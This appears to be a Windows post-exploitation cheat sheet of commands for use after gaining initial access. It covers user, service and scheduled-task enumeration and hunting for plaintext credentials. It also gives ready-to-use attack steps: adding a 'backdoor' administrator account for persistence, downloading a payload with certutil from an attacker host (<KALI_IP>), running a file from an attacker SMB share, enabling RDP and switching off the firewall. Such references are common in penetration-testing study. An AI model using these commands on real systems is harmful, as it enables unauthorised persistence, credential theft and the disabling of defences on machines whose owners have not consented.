**Purpose:**

Fast reference for commands you repeatedly need **after initial access** on Windows

```cmd
whoami
```
→ Confirms **which user** you are.
```cmd
whoami /priv
```
→ Shows enabled privileges (key for privesc like SeImpersonate).
```cmd
whoami /groups
```
→ Shows group memberships (Admins, Backup Operators, etc.).


## **Users & Groups**

```cmd
net user
```
→ Lists all local users.

```cmd
net user <username>
```
→ Inspect a specific user.

```cmd
net localgroup
```
→ Lists local groups.

```cmd
net localgroup administrators
```
→ Check who has admin rights.


## **Backdoor Account**
```cmd
net user backdoor Password1 /add
```
→ Creates a new local user (persistence).

```cmd
net localgroup administrators backdoor /add
```
Grants admin rights to the backdoor user.

```cmd
net user backdoor
```
→ Verify account creation and group membership.

## **File System Navigation**
```cmd
cd \
dir
dir /a
```
→ Basic navigation, including hidden files.

```cmd
tree /f
```
→ Quickly visualize folders + files (great for finding scripts).


##  **Searching for Interesting Files**
```cmd
where /r C:\ *.config
where /r C:\ *.xml
where /r C:\ *.ini
```
Read Contents:
```cmd
type filename.config
more filename.xml
type filename.ini
```
→ Hunt for config files that often store creds.


```cmd
dir C:\ /s /b | findstr /i password
```
→ Keyword search for plaintext credentials.

## **Permissions**
```cmd
icacls <file_or_dir>
```
→ Check if you can **write / modify / replace** files.
Look for:
- (F) Full control
    
- (M) Modify
    
- (W) Write



## **Services**
```cmd
sc query
```
List all services.


```cmd
sc qc <service_name>
```
→ See service binary path and run context.

```cmd
icacls <service_binary_path>
```
→ Check if the service binary is writable.


```cmd
sc stop <service>
sc start <service>
```
→ Restart service to trigger your payload (only if allowed).




## **Scheduled Tasks**
```cmd
schtasks
schtasks /query
```
→ List scheduled tasks.

```cmd
schtasks /query /fo LIST /v
```
→ View full details (run user, trigger, command).


```cmd
schtasks /query /tn "<TaskName>" /fo LIST /v
```
→ Inspect a specific task for writable scripts.




## **Network Info**
```cmd
ipconfig
ipconfig /all
```
→ See IPs, domain info, adapters.

```cmd
netstat -ano
```
→ See listening services and ports.

```cmd
tasklist | findstr <PID>
```
→ Match a process name to a port from netstat output. A PID (Process ID) is the unique number Windows assigns to each running program — use it to find which process owns a listening port.






## **File Transfer (Quick)**
```cmd
certutil -urlcache -f http://<KALI_IP>/file.exe file.exe
```
→ Download a file via HTTP (does NOT execute).

```cmd
\\<KALI_IP>\share\file.exe
```




## **RDP & Sessions**
```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
```
→ Check if RDP is enabled.

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
→ Enable RDP (admin only).


```cmd
netsh advfirewall set all profiles state off
```
→ Disable firewall to allow RDP/tools.


## **Quick Credential Testing Commands**
```cmd
runas /user:DOMAIN\user cmd.exe
```
→ Test credentials locally.

```bash
xfreerdp /v:<IP> /u:user /p:password
```
Test RDP access.